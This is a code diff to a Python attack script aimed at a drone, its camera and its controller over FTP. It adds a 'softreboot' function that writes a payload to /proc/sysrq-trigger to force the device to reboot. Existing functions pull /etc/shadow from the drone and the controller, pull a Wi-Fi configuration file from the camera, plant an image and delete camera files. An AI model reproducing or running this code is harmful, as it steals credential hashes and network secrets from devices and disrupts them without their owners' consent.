@@ -1,5 +1,5 @@
 from ftplib import FTP
-import os
+import multiprocessing
 import os
 
 def plantrecoveryimage(ftp):
@@ -20,12 +20,31 @@ def cleardcim(ftp):
              ftp.rmd(item)
                 
                 
+def softreboot(ftp):
+    
+    def com():
+        try:
+            ftp.cwd('/proc')
+            ftp.storbinary('STOR sysrq-trigger', open('../res/payloads/sysrq-trigger', 'rb'))
+        except Exception as e:
+            print str(e)
+            
+    p = multiprocessing.Process(target=com)
+    p.start()
+    p.join(2)
+    if p.is_alive():
+        p.terminate()
+        p.join()
+                
+                
 def gatherinteldrone(ftp):
     __retrievefile(ftp, '/etc/shadow', 'drone/')
 
+    
 def gatherintelcamera(ftp):
     __retrievefile(ftp, '/MISC/wifi.conf', 'camera/')
 
+    
 def gatherintelcontroller(ftp):
     __retrievefile(ftp, '/etc/shadow', 'controller/')
     
